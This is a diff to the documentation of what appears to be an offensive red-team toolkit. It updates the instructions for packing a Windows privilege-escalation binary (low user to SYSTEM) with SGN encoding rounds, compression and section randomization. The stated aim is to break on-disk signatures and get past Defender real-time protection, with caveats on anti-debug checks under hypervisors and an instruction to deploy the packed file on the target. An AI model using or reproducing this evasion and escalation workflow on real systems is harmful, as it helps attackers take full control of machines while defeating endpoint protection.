@@ -778,31 +778,32 @@ Verified end-to-end with Defender real-time protection ON, no
 exclusions, lowuser → SYSTEM chain reaching STRONG verdict:
 
 ```bash
-# Build the orchestrator first per §2.0, then pack it:
+# Build the orchestrator first per §2.0, then pack it.
+# Mode-3 full pipeline (Compress + Randomize + 5 SGN rounds) — the
+# strongest signature-on-disk break short of antidebug.
 go run ./cmd/packer pack \
     -in privesc-e2e.exe \
     -out privesc-e2e-packed.exe \
     -format windows-exe \
-    -rounds 3
+    -rounds 5 \
+    -compress \
+    -randomize
 ```
 
 Deploy `privesc-e2e-packed.exe` AS `privesc-e2e.exe` on the
 target — the orchestrator side of §2.3 stays unchanged.
 
-### What does NOT work (yet) on the 12 MiB Go dropper
+### Caveat — `-antidebug` and hypervisors
 
-| Flag | Why it breaks |
+| Flag | When NOT to use it |
 |---|---|
-| `-compress` | LZ4 inflate at runtime collides with Go's section-layout introspection — packed binary crashes with `STATUS_ACCESS_VIOLATION` (`0xC0000005`) before `main()` |
-| `-randomize` | Phase-2 section renaming breaks Go's runtime PEB walk for `.text`/`.gopclntab` lookup — same access-violation profile |
-| `-antidebug` | Use only on bare-metal targets. On any hypervised host (KVM / Hyper-V / VMware) the RDTSC ↔ CPUID delta in the slice-5.6 stub trips on VMEXIT — see §9 |
+| `-antidebug` | Bare-metal only. On any hypervised host (KVM / Hyper-V / VMware) the RDTSC ↔ CPUID delta in the slice-5.6 stub trips on VMEXIT — silent no-op LoadLibrary at runtime. See §9. |
 
-Smaller Go binaries (the `pe/packer/testdata/winhello.exe`
-fixture, 1.6 MiB) survive the full Mode-3 pipeline
-(`-compress -randomize -antidebug`) without runtime breakage. The
-limit on the 12 MiB orchestrator is a known constraint of the
-packer's interaction with Go's runtime introspection on large
-binaries.
+The other two flags (`-compress`, `-randomize`) used to crash
+large Go binaries before the `InjectStubPE` MEM_WRITE fix for the
+stub-section BSS scratch region. Now verified working on the
+12 MiB orchestrator, the 1.6 MiB `winhello.exe` test fixture, and
+every smaller binary in the test suite.
 
 ### Verification on the target
 
